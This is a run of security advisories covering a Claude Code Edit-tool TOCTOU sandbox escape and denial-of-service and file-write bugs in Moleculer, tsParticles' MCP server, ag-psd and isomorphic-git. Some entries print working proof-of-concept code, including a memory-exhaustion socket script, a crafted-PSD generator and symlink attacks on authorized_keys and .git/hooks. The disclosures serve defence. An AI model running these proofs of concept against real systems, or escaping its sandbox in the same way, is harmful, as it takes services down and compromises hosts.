items.title: [@anthropic-ai/claude-code] Claude Code: TOCTOU Race in Edit Tool Allows File Writes Outside the Workspace
items.summary: Claude Code validated Edit tool targets using point-in-time pathname and symlink resolution that was not bound to the underlying directory inodes or file descriptors. On macOS, a process running inside Claude Code's Bash sandbox could exploit the resulting time-of-check to time-of-use window by atomically swapping an in-workspace parent directory with a symlink after validation completed, causing the unsandboxed Edit implementation to overwrite an attacker-selected user-writable file outside the workspace. Exploiting this required the ability to run attacker-controlled code inside the sandbox, such as through a malicious repository or dependency script.Users on standard Claude Code auto-update have received this fix automatically. Users performing manual updates are advised to update to the latest version.Claude Code thanks hackerone.com/mahoraga007 (Sunder Singh) for reporting this issue.Referenceshttps://github.com/anthropics/claude-code/security/advisories/GHSA-5xjx-9qx6-jcrvhttps://nvd.nist.gov/vuln/detail/CVE-2026-88968https://github.com/anthropics/claude-code/releases/tag/v2.1.251https://github.com/advisories/GHSA-5xjx-9qx6-jcrv

items.title: [moleculer] Moleculer: Unauthenticated Denial of Service via negative length field in the TCP transporter packet parser
items.summary: SummaryThe TCP transporter's packet parser (src/transporters/tcp/parser.js) reads the packet length field with Buffer.prototype.readInt32BE, a signed read. A crafted packet whose length field has the sign bit set yields a negative length. The parser then advances past the parsed message with packet = packet.slice(length), but Buffer.prototype.slice clamps an out-of-range negative start index to 0, so the buffer is returned unchanged. The while (packet.length > 0) loop condition therefore never becomes false, producing an infinite synchronous loop that blocks the Node.js event loop indefinitely.ImpactAny Moleculer node using the TCP transporter can be rendered completely unresponsive by an unauthenticated remote peer sending a single ~10-byte crafted TCP packet, before any protocol handshake or authentication takes place. TcpReader.onTcpClientConnected pipes each accepted socket's bytes straight into a fresh Parser instance (socket.pipe(parser)) with no handshake, so the code path is reachable by any peer able to reach the transporter's listening port. Because Node.js is single-threaded, the hang blocks the entire event loop of the process, taking down every service hosted in it until it is forcibly restarted. TCP transporter endpoints are frequently auto-discovered via UDP broadcast, so any host on the same network segment can reach the port.Neither the CRC check nor maxPacketSize mitigate the issue: the CRC bytes are fully attacker-computable, and maxPacketSize bounds the received buffer size, not the value of the length field.Affected componentParser._write in src/transporters/tcp/parser.js.PatchThe fix validates that the decoded length is at least the 6-byte header size before processing, rejecting negative and undersized values (which would otherwise fail to shrink the buffer) with an error on the write callback instead of looping.CreditReported by xor4xor via the Tidelift security program.Referenceshttps://github.com/moleculerjs/moleculer/security/advisories/GHSA-h89v-g948-47vphttps://nvd.nist.gov/vuln/detail/CVE-2026-97705https://github.com/moleculerjs/moleculer/commit/168ecbdc245c9a9d1dc4ef9b8a81dbae38ee3063https://github.com/moleculerjs/moleculer/commit/914074e502ae403a0338ad168b45b16d6bcc3e44https://github.com/moleculerjs/moleculer/releases/tag/v0.14.36https://github.com/moleculerjs/moleculer/releases/tag/v0.15.2https://github.com/advisories/GHSA-h89v-g948-47vp

items.title: [@tsparticles/mcp-server] tsParticles: A single anonymous MCP session can monopolize HTTP mode and deny new clients
items.summary: SummaryThe HTTP mode of @tsparticles/mcp-server creates a single stateful StreamableHTTPServerTransport instance and reuses it for all clients. The first anonymous client that initializes the MCP endpoint claims the shared transport state, and later clients cannot create their own sessions.This was verified on v4.3.0 at commit 0266d469aa2d719cb66a9c6bf09aded4186ec17c. The same singleton transport pattern is still present in v4.3.1 and current main.Affected CodeThe server creates one shared transport before accepting requests:const transport = new StreamableHTTPServerTransport({  sessionIdGenerator: () => randomUUID(),});const httpServer = createServer(async (req, res) => {  ...  await transport.handleRequest(req, res, parsedBody);});Because the same transport object is reused across all requests, the first successful initialize call changes the state for all later clients.ReproductionSend two independent initialize requests without a prior mcp-session-id.First request:{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-11-25","capabilities":{},"clientInfo":{"name":"first-client","version":"1.0.0"}}}Second request:{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-11-25","capabilities":{},"clientInfo":{"name":"second-client","version":"1.0.0"}}}Observed result in 3 out of 3 runs:first response: HTTP 200 with mcp-session-idsecond response: HTTP 400{"jsonrpc":"2.0","error":{"code":-32600,"message":"Invalid Request: Server already initialized"},"id":null}ImpactAn unauthenticated remote client can win the first-session race and prevent all later legitimate clients from establishing new MCP sessions until the process is restarted. The first session remains functional, but new clients are denied service.RecommendationCreate a transport per session or maintain a bounded session-id-to-transport map. Do not reuse one stateful transport instance for all HTTP clients.Referenceshttps://github.com/tsparticles/tsparticles/security/advisories/GHSA-h7c4-q426-7jh9https://nvd.nist.gov/vuln/detail/CVE-2026-76893https://github.com/tsparticles/tsparticles/pull/5888https://github.com/tsparticles/tsparticles/commit/d3b5672bd61bb847abfa21193c34eabf7aba6896https://github.com/advisories/GHSA-h7c4-q426-7jh9

items.title: [@tsparticles/mcp-server] tsParticles: Malformed JSON requests can terminate the @tsparticles/mcp-server HTTP process
items.summary: SummaryThe HTTP mode of @tsparticles/mcp-server parses incoming /mcp request bodies with JSON.parse() outside a request-local error boundary. A single malformed JSON request causes the async request handler to throw and terminates the Node.js process.This was verified on v4.3.0 at commit 0266d469aa2d719cb66a9c6bf09aded4186ec17c. Version 4.3.1 appears to fix this by returning HTTP 400 for invalid JSON.Affected CodeThe vulnerable handler is:if (req.method === "POST" && req.url === "/mcp") {  const body = await new Promise<string>((resolve, reject) => {    const chunks: Buffer[] = [];    req.on("data", (chunk) => chunks.push(Buffer.from(chunk)));    req.on("end", () => resolve(Buffer.concat(chunks).toString("utf8")));    req.on("error", reject);  });  const parsedBody = body ? JSON.parse(body) : undefined;  await transport.handleRequest(req, res, parsedBody);}The JSON.parse() call is not wrapped in try/catch.ReproductionStart the HTTP server and send this malformed request:POST /mcp HTTP/1.1Content-Type: application/jsonMcp-Protocol-Version: 2025-11-25{"jsonrpc":Observed result in 3 out of 3 runs:exit_code=1SyntaxError: Unexpected end of JSON inputat Server.<anonymous> (integrations/mcp-server/src/index.ts:407:38)ImpactAn unauthenticated remote attacker can terminate the exposed MCP process with a single malformed request. The service remains unavailable until restarted by an external supervisor.RecommendationWrap request parsing in a local try/catch and return a bounded HTTP 400 response such as:{"error":"Invalid JSON"}The process should remain alive after malformed requests.Referenceshttps://github.com/tsparticles/tsparticles/security/advisories/GHSA-4p8p-pjpq-2w7hhttps://nvd.nist.gov/vuln/detail/CVE-2026-76892https://github.com/tsparticles/tsparticles/pull/5875https://github.com/tsparticles/tsparticles/commit/25fb70e7f527a91568adaef576570289083f243bhttps://github.com/advisories/GHSA-4p8p-pjpq-2w7h

items.title: [@tsparticles/mcp-server] tsParticles: Unbounded HTTP Request Body Buffering in @tsparticles/mcp-server Leads to Remote DoS
items.summary:
SummaryThe HTTP server mode of @tsparticles/mcp-server accumulates all incoming request body chunks into an in-memory Buffer[] array with no size limit before calling JSON.parse. An unauthenticated remote attacker can stream an arbitrarily large body to POST /mcp, exhausting the Node.js process memory and causing a Denial of Service. The official Docker image ships with HTTP mode enabled by default (--port 3000 on 0.0.0.0), making this exploitable without any special configuration in containerized deployments.DetailsThe vulnerability exists in integrations/mcp-server/src/index.ts at lines 399–407. The POST /mcp request handler resolves a Promise that pushes every incoming data chunk into a Buffer[] array without checking the cumulative size, a Content-Length header, or any other guard:// integrations/mcp-server/src/index.ts:399-407if (req.method === "POST" && req.url === "/mcp") {  const body = await new Promise<string>((resolve, reject) => {    const chunks: Buffer[] = [];    req.on("data", (chunk) => chunks.push(Buffer.from(chunk)));  // no size guard    req.on("end", () => resolve(Buffer.concat(chunks).toString("utf8")));    req.on("error", reject);  });  const parsedBody = body ? JSON.parse(body) : undefined;The complete data flow leading to exploitation:index.ts:390 — HTTP server is created.index.ts:399 — POST /mcp branch is entered; no authentication is performed.index.ts:401-403 — Every chunk is appended to chunks[] without any byte-count check.index.ts:407 — The concatenated buffer is passed to JSON.parse.index.ts:416 — The server listens on 0.0.0.0, exposing it on all network interfaces.There is no Content-Length validation, no body-size middleware, and no 413 Payload Too Large response in the server source. The official Dockerfile (integrations/mcp-server/Dockerfile) sets CMD ["node", "dist/index.js", "--port", "3000"], meaning Docker deployments run in HTTP mode by default without any additional opt-in.A suggested patch would be to track cumulative received bytes and destroy the request once a threshold (e.g., 1 MB) is exceeded:--- a/integrations/mcp-server/src/index.ts+++ b/integrations/mcp-server/src/index.ts@@ import { createServer } from "node:http"; import { randomUUID } from "node:crypto"; const PACKAGE_VERSION = "0.1.0";+const maxRequestBodyBytes = 1024 * 1024;@@     if (req.method === "POST" && req.url === "/mcp") {       const body = await new Promise<string>((resolve, reject) => {         const chunks: Buffer[] = [];-        req.on("data", (chunk) => chunks.push(Buffer.from(chunk)));+        let received = 0;+        req.on("data", (chunk) => {+          received += chunk.length;+          if (received > maxRequestBodyBytes) {+            req.destroy(new Error("Request body too large"));+            return;+          }+          chunks.push(Buffer.from(chunk));+        });         req.on("end", () => resolve(Buffer.concat(chunks).toString("utf8")));         req.on("error", reject);       });PoCEnvironment setup:# Build the Docker image from the repository rootdocker build \  -f /path/to/vuln-001/Dockerfile \  -t vuln001-mcp \  /path/to/tsparticles-repo# Run with a 256 MB memory cap (matching the dynamic reproduction)docker run -d \  -p 127.0.0.1:3000:3000 \  --memory=256m --memory-swap=256m \  --name vuln001-mcp \  vuln001-mcpExploit (Python PoC — poc.py):The script uses chunked transfer encoding so only O(1 MB) of Python-side memory is needed, while the Node.js process accumulates every received chunk in its Buffer[] array.python3 poc.py --host 127.0.0.1 --port 3000 --mb 300 --container vuln001-mcpEquivalent minimal request:import sockets = socket.create_connection(("127.0.0.1", 3000))headers = (    "POST /mcp HTTP/1.1
"    "Host: 127.0.0.1:3000
"    "Content-Type: application/json
"    "Transfer-Encoding: chunked
"    "Connection: close

").encode()s.sendall(headers)prefix = b'{"jsonrpc":"2.0","id":1,"method":"tools/list","params":"'s.sendall(f"{len(prefix):x}
".encode() + prefix + b"
")chunk = b"A" * (1024 * 1024)  # 1 MB per writefor _ in range(300):           # stream 300 MB total    s.sendall(f"{len(chunk):x}
".encode() + chunk + b"
")Expected result:Baseline memory usage: ~24.9 MiB / 256 MiB.After ~209 MB received, the server-side BrokenPipeError occurs as Docker's OOM-killer terminates the process.docker inspect vuln001-mcp shows State.OOMKilled = true and State.Status = exited.Dynamic reproduction confirmed: OOMKilled=true was observed during Phase 2 testing with a 300 MB stream against a container limited to 256 MB.ImpactAn unauthenticated remote attacker who can reach the POST /mcp HTTP endpoint can cause the Node.js server process to consume unbounded memory, leading to process termination (OOM kill) and complete service unavailability. items.title: [ag-psd] ag-psd: Uncontrolled Memory Allocation in PSD Layer Decoding (totalMemoryLimit bypass)
items.summary: SummaryThe readPsd() function in ag-psd accepts a totalMemoryLimit option to cap memory usage when parsing untrusted PSD files, but this limit is never forwarded to the layer image buffer allocation path. A property name mismatch (totalMemoryLimit vs. memoryLimit) causes the size guard inside createImageDataBitDepth to be skipped unconditionally. An attacker who can supply a crafted PSD to any application using ag-psd for server-side parsing can force an unbounded heap allocation — a 5000×5000 layer in a 86-byte file allocates 200 MB — leading to denial of service through process memory exhaustion regardless of what limit the caller specified.DetailsreadPsd() (exported from src/index.ts:22) wraps caller-supplied bytes in a PsdReader object that inherits ReadOptions, which defines totalMemoryLimit?: number (src/psd.ts:1819). A default of 2 GB is written into the reader at src/psdReader.ts:237.When the parser reaches a layer, it calls decodeLayerImageData(layer, reader) at src/psdReader.ts:568-569, passing the reader object directly as the second argument. The decodeLayerImageData function signature is:// src/psdReader.ts:639-642function decodeLayerImageData(layer: Layer, options: {    useImageData?: boolean,    throwForMissingFeatures?: boolean,    memoryLimit?: number   // ← expects "memoryLimit", not "totalMemoryLimit"}) {    const imageData = getDataFromLayer(layer, ..., options.memoryLimit);Because reader has totalMemoryLimit but not memoryLimit, options.memoryLimit evaluates to undefined. This value is passed down to createImageDataBitDepth at src/psdReader.ts:684:// src/psdReader.ts:671-684const layerWidth  = (layer.right  || 0) - (layer.left || 0);const layerHeight = (layer.bottom || 0) - (layer.top  || 0);// ...imageData = createImageDataBitDepth(layerWidth, layerHeight, bitsPerChannel, 4, memoryLimit);Inside createImageDataBitDepth, the size guard at src/psdReader.ts:861-864 is:const sizeInBytes = width * height * channels * Math.max(1, bitDepth / 8);if (memoryLimit !== undefined && sizeInBytes > memoryLimit) throw new Error('Exceeded memory limit');Because memoryLimit is undefined, the condition is always false. The allocation proceeds unconditionally at src/psdReader.ts:872:return new Uint16Array(width * height * channels);   // attacker-controlled sizeA secondary unbounded allocation exists at src/psdReader.ts:1138-1139, where inflateSync(compressed) decompresses ZIP-encoded channel data without any cap on the output size, enabling a similar DoS via ZIP bomb payloads.PoCEnvironment setup# Clone and build ag-psd at the affected commitgit clone https://github.com/Agamnentzar/ag-psd.gitcd ag-psdgit checkout e64f0c96a5b8f9ea7c79599d08bbcfc57345b781npm cinpm run buildBuild and run with Docker (self-contained)# From the report directory (containing vuln-001/ and repo/)docker build -t ag-psd-vuln-001 -f vuln-001/Dockerfile .docker run --rm -e APP_DIR=/app -e RESULT_DIR=/tmp ag-psd-vuln-001Manual reproduction (Node.js inline)// save as exploit.js and run: node exploit.jsrequire('./initialize-canvas');const { readPsd } = require('./dist');const u16 = n => { const b = Buffer.alloc(2); b.writeUInt16BE(n); return b; };const i16 = n => { const b = Buffer.alloc(2); b.writeInt16BE(n); return b; };const u32 = n => { const b = Buffer.alloc(4); b.writeUInt32BE(n); return b; };const i32 = n => { const b = Buffer.alloc(4); b.writeInt32BE(n); return b; };const sec = (buf, r = 1) => Buffer.concat([u32(buf.length), buf, Buffer.alloc((r - buf.length % r) % r)]);const w = 5000, h = 5000;// Layer record: top=0, left=0, bottom=5000, right=5000, 0 channels, blending info, extra=0const layer = Buffer.concat([    i32(0), i32(0), i32(h), i32(w),    u16(0),    Buffer.from('8BIMnorm'),    Buffer.from([255, 0, 0, 0]),    u32(0),]);// PSD header: sig, version=1, reserved, channels=3, height=1, width=1, depth=16, colorMode=RGBconst psd = Buffer.concat([    Buffer.from('8BPS'), u16(1), Buffer.alloc(6),    u16(3), u32(1), u32(1), u16(16), u16(3),    sec(Buffer.alloc(0)),              // ColorModeData    sec(Buffer.alloc(0)),              // ImageResources    sec(sec(Buffer.concat([i16(1), layer]), 2)),  // LayerAndMaskInfo    u16(0), Buffer.alloc(6),           // ImageData (raw, minimal)]);const before = process.memoryUsage();const out = readPsd(psd, { useImageData: true, totalMemoryLimit: 1024 });const after = process.memoryUsage();console.log('PSD_BYTES=' + psd.length); // 200000000Expected outputPSD_BYTES=86TOTAL_MEMORY_LIMIT_OPTION=1024LAYER_IMAGE_BYTES=200000000ARRAYBUFFER_DELTA=200000000RSS_BEFORE_KB=55052RSS_AFTER_KB=250508VULN_001_EXPLOITED=truePASS: totalMemoryLimit=1024 was bypassed; allocated 200000000 bytes in a single layer image bufferA 1 KB totalMemoryLimit is completely ignored; a 190 MB buffer is allocated f

items.title: [isomorphic-git] isomorphic-git: Path traversal via a ".." tree-entry name writes files outside the working directory on clone/checkout
items.summary: Summaryisomorphic-git's tree parser (src/models/GitTree.js) validates each entry name only against the path separators / and \. It does not reject the standalone reserved name .., so a malicious repository can, on a single clone/checkout, write files outside the workingdirectory (unbounded depth). Works on any host-backed fs provider.DetailsThe guard is:// src/models/GitTree.jsif (path.includes('\\') || path.includes('/')) {  throw new UnsafeFilepathError(path)}The standalone string .. passes. isomorphic-git assembles the full path incrementally across tree levels, so nesting .. trees yields ../escaped.txt, ../../escaped.txt, … with unbounded depth (each level is a separate tree object that passes the per-entry guard). On checkout mkdir(workdir/..) hits EEXIST (ignored) and the file is written above the working directory. Depth is chosen to reach the home dir, /etc, /tmp, etc.; overwriting a shell rc / config / startup file can escalate to code execution.Canonical git behavior (divergence)git rejects this via verify_path(): git read-tree fails with error: invalid path '../escaped.txt' and git fsck flags warning … hasDotdot: contains '..'. (git's verify_path also rejects . and .git, the latter flagged by fsck as hasDotgit — see the fix note below.) GitHub runs fsck on push, so such a tree can't be hosted there; reach is limited to a self-hosted/Smart-HTTP remote or a MitM.PoChttps://github.com/spiceoverflow/av2-dotdot-traversal — open in a Codespace; a single git.clone() from the bundled server writes escaped.txt one directory above the clone target (DEPTH=N escapes N levels):[AV-2] *** PATH TRAVERSAL CONFIRMED ***[AV-2] File written outside workdir: …/escaped.txtImpactA path-traversal arbitrary file write outside the working directory (CWE-22), triggered by a single clone/checkout; it can escalate to code execution by overwriting shell rc, config, or startup files.Any application or user that clones/checks out an untrusted (or compromised / MitM'd) repository with isomorphic-git on a host-backed filesystem (Linux, macOS, or Windows — no symlink or privilege required). Requires a non-GitHub remote (self-hosted / Smart-HTTP) or a MitM, since GitHub's fsck rejects trees containing ...Suggested fixIn the tree parser, reject any entry name equal to . or ... For full verify_path parity it should also reject .git (case-insensitively, trailing dots/spaces stripped) and the NTFS 8.3 / HFS variants git blocks. Note: a literal .git entry is not independently exploitable viaclone/checkout in current isomorphic-git — the checkout walk skips a .git tree entry (a sibling file is written but the .git entry is not), so rejecting .git is defense-in-depth / git parity rather than a separately demonstrated bug. Additionally, normalize and bounds-check the assembled full path against the working-tree root before any filesystem write.Referenceshttps://github.com/isomorphic-git/isomorphic-git/security/advisories/GHSA-cw2g-2vwq-88w6https://nvd.nist.gov/vuln/detail/CVE-2026-63478https://github.com/isomorphic-git/isomorphic-git/pull/2370https://github.com/isomorphic-git/isomorphic-git/commit/823843d1cd19182df79bc907c767f5bcecb39a0bhttps://github.com/isomorphic-git/isomorphic-git/releases/tag/v1.38.6https://github.com/advisories/GHSA-cw2g-2vwq-88w6

items.title: [isomorphic-git] isomorphic-git: Circular symbolic references cause non-terminating resolution (DoS)
items.summary: SummaryA malicious server can advertise circular symref= capabilities (e.g. a → b and b → a). isomorphic-git writes them to disk as loose symrefs, and GitRefManager.resolve() follows them with no depth limit and no cycle detection, so any later operation that resolves one of them (log, status, checkout, branch, …) loops forever — a persistent denial of service from a single clone.Detailssrc/managers/GitRefManager.js — resolve() only enforces a depth limit when a depth argument is passed (depth = undefined by default), and has no visited-set:static async resolve({ fs, gitdir, ref, depth = undefined }) {  if (depth !== undefined) { depth--; if (depth === -1) return ref }  …}updateRemoteRefs persists all server-supplied symrefs unconditionally. After clone the client has refs/remotes/origin/a → ref: refs/remotes/origin/b and b → a on disk; resolving either never terminates. Because the bad refs live on disk, the repo is effectively bricked for the application.Canonical git behavior (divergence)git caps symref resolution at SYMREF_MAXDEPTH = 5 (refs.c): git rev-parse a returns immediately with warning: ignoring dangling symref — no recursion, no hang.PoChttps://github.com/spiceoverflow/av5-circular-symref — open in a Codespace; clone writes the circular symrefs, then git.log on one never returns (the runner stops it after a 20s hang):[AV-5] refs/remotes/origin/a contains: ref: refs/remotes/origin/b[AV-5] refs/remotes/origin/b contains: ref: refs/remotes/origin/a[run] *** DoS CONFIRMED: resolving a circular symref never terminates ***ImpactA persistent denial of service via non-terminating symbolic-ref resolution (CWE-674 / CWE-835). After a single clone from a malicious (or MitM'd) server the circular refs are written to disk, so every later operation that resolves them (log, status, checkout, branch, …) hangs forever — the repository becomes effectively unusable for the application.Impacted: any application that clones from untrusted/compromised remotes with isomorphic-git.Suggested fixAdd visited-set cycle detection (and/or a default maximum depth, as git does) in GitRefManager.resolve(); optionally validate server-supplied symref targets before persisting.Referenceshttps://github.com/isomorphic-git/isomorphic-git/security/advisories/GHSA-96wc-2m84-2cj7https://nvd.nist.gov/vuln/detail/CVE-2026-63475https://github.com/isomorphic-git/isomorphic-git/pull/2370https://github.com/isomorphic-git/isomorphic-git/commit/823843d1cd19182df79bc907c767f5bcecb39a0bhttps://github.com/isomorphic-git/isomorphic-git/releases/tag/v1.38.6https://github.com/advisories/GHSA-96wc-2m84-2cj7

items.title: [isomorphic-git] isomorphic-git: Arbitrary file write outside of working tree via directory symlink during checkout (potential RCE)
items.summary: Summarygit.checkout writes working-tree files through a directory symlink without checking the leading path, so a malicious repository can write outside the intended working directory. The defect is in isomorphic-git's checkout logic itself and is therefore independent of the fs provider. The impact depends on the configured filesystem; worst case is arbitrary file write on the host, e.g. injecting an attacker key into ~/.ssh/authorized_keys → remote login / code execution.DetailsA single git tree can't hold a name as both a symlink and a directory, so the attack uses two states:Commit N:    config            (mode 120000, symlink → ../.ssh)Commit N+1:  config/           (mode 040000, tree)               authorized_keys (mode 100644, attacker public key)Checking out commit N writes config as a directory symlink. Checking out commit N+1 sees config/authorized_keys as a new path: isomorphic-git mkdirs the parent (config, already a symlink → EEXIST, ignored) then writeFiles the file, which the OS resolves through the symlink to outside the working directory. A file-level symlink swap is caught (the 120000→100644 mode change triggers an rm), but the directory-level variant is not — the payload is always a new child path, a plain create, so the parent symlink is never removed.The symlink target is attacker-chosen. Besides ~/.ssh, pointing it at the repo's own control directory — hooks → .git/hooks then hooks/pre-commit, or x → .git then overwriting .git/config (core.hooksPath / alias / core.fsmonitor) — yields RCE on the next native git command without depending on ~/.ssh existing, since .git/ is always present in a fresh clone.Canonical git behavior (divergence)git refuses to do this: has_symlink_leading_path() (symlinks.c) checks each leading path component during checkout and will not follow a symlink — the hardening behind CVE-2021-21300 and CVE-2024-32002. isomorphic-git has no equivalent check.PoChttps://github.com/spiceoverflow/av1-symlink-hook-rce — open in a Codespace; it builds the malicious repo, serves it locally, and runs a victim. Output on Linux:[AV-1] Directory symlink on disk: …/config → ../.ssh  (→ /home/node/.ssh)[AV-1] *** SSH KEY INJECTION CONFIRMED ***Trigger: minimal realistic path is clone (commit N) + a later pull (commit N+1) — ordinary sync of an already-trusted repo. It also collapses to a single clone when the consuming app reads or writes into the cloned tree, or when a symlink already exists on disk.Impactisomorphic-git is filesystem-agnostic, so exploitability and blast radius depend on the active fs provider — specifically whether it creates a symlink and follows it on a later write:Node fs on Linux/macOS (servers, CI, CLIs, Electron/desktop tooling — the common server-side use): real OS symlinks → the write lands anywhere the process can reach → arbitrary file write on the host → RCE (the PoC above). Highest impact.Node fs on Windows: fs.symlink typically requires privilege and throws EPERM, so the symlink-plant step usually fails — not exploitable by default. (A property of the OS/provider, not of isomorphic-git.)In-memory / browser providers (memfs, ZenFS, lightning-fs, custom fs): there is no host filesystem to escape to, so the worst case is writing outside the intended clone directory but within that virtual filesystem — i.e. corrupting other repos/app data the same provider holds. Bounded by the sandbox, and only if the provider implements symlink creation + following.The CVSS above reflects the worst-case (Node fs on a POSIX host).
